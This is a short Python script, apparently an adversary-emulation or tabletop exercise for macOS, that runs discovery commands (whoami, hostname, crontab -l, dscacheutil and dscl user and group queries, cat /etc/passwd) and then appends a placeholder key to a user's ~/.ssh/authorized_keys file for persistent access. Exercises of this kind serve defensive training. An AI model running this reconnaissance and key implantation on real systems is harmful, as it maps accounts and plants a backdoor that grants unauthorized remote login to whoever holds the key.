import subprocess
subprocess.call(['whoami'])
subprocess.call(['hostname'])
subprocess.call(['lsappinfo', 'list'])
subprocess.call(['crontab', '-l'])
subprocess.call(['dscacheutil', '-q', 'user'])
subprocess.call(['dscl', '.', 'ls', '/Groups'])
subprocess.call(['cat', '/etc/passwd'])
subprocess.call(['lsappinfo', 'list'])
with open("/Users/user/.ssh/authorized_keys","a") as f:
  f.write("tabletop_key_value")
